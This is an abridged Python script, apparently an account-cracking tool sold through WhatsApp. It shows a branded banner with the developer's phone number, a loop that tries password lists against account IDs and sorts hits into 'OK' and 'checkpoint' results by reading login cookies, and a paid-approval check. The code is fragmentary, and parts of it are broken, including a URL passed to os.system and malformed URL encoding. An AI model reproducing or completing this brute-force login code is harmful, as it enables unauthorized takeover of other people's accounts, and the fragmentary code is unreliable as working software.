...
\33[1;37m--------------------------------------------
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m DEVELOPER :   CYBER SOJIB 69
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m TOOLS     :   FILE & RANDOM
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m GITHUB    :   K1NG-SOJIB-69
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m VERSION   :   0.0.1
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m WHATSAPP  :   +8801879614819
\33[1;37m--------------------------------------------""")
...
def menu():
	...
	if me in ["1", "01"]:
		...
		os.system('https://github.com/K1NG-SOJIB-69/K1NG-SOJIB-69/blob/main/Approval.txt')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SCANING-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[SCANING-CP] {idf} | {pw}')     
				...
				print(f'\r\r\x1b[38;5;46m[SCANING-OK] '+idf+ ' | '+pw+'')
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Tooken%20:%20'+id);os.system('am start https://wa.me/+8801879614819?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
